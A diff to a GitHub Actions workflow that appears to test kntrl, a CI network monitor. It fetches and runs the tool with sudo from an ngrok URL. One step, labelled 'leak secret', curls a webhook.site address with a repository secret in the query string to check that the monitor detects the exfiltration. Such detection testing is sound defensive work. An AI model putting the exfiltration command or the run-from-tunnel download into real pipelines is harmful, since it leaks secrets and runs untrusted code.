@@ -37,7 +37,7 @@ jobs:
         run: |
           wget -q https://72e3-46-197-210-176.ngrok-free.app/kntrl
           chmod +x kntrl
-          sudo ./kntrl start --mode=monitor --allowed-hosts=download.kondukto.io --allow-github-meta=true --daemonize 
+          sudo ./kntrl start --mode=monitor --allowed-hosts=download.kondukto.io --allow-github-meta=true
           
       # Runs a set of commands using the runners shell
       - name: Stop prevent action
@@ -45,7 +45,7 @@ jobs:
           SECRET: ${{ secrets.MY_SECRET }}
         run: |
           echo "leak secret"
-          curl --connect-timeout=5 https://webhook.site/2c215e92-a7db-465c-b061-866f7cf1a9ca?secret=$SECRET\&id=$GITHUB_RUN_ID || true
+          curl --connect-timeout 5 https://webhook.site/2c215e92-a7db-465c-b061-866f7cf1a9ca?secret=$SECRET\&id=$GITHUB_RUN_ID || true
           
         # Runs a set of commands using the runners shell
       - name: Run allowed action
@@ -54,9 +54,10 @@ jobs:
           wget --connect-timeout=3 https://download.kondukto.io/kntrl/myartifact.txt 
 
       # Runs a set of commands using the runners shell
+      # sudo ./kntrl stop
       - name: print report
         run: |
-          sudo ./kntrl stop
+          
           echo "Print report"
           echo "---------------------"
           cat /tmp/kntrl.out
